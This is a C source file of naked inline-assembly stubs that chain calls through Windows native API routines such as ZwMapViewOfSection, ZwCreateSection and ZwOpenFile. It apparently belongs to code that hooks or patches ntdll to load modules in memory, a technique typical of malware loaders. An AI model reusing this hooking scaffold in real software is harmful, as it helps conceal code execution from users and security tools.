/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "8. AssemblyBlock1.h"

/*************************************************************************
** ASSEMBLY BLOCK 1.                                                    **
*************************************************************************/                                    

void __declspec(naked) __ASM_BLOCK1_0(void)
{
	__asm
	{
		call    __ASM_BLOCK1_1
		ASM_ZwMapViewOfSection
	}
}

void __declspec(naked) __ASM_BLOCK1_1(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 4
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_2
		ASM_ZwCreateSection
	}
}

void __declspec(naked) __ASM_BLOCK1_2(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 8
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_3
		ASM_ZwOpenFile
	}
}

void __declspec(naked) __ASM_BLOCK1_3(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 8
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_4
		ASM_ZwClose
	}
}

void __declspec(naked) __ASM_BLOCK1_4(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 10h
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_5
		ASM_ZwQueryAttributesFile
	}
}

void __declspec(naked) __ASM_BLOCK1_5(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 14h
		call    __ASM_REF_7
		pop     ecx
		call    __ASM_BLOCK1_6
		ASM_ZwQuerySection
	}
}

void __declspec(naked) __ASM_BLOCK1_6(void)
{
	__asm
	{
		pop     edx
		push    ecx
		add     ecx, 18h
		call    __ASM_REF_7
		pop     ecx
		retn
	}
}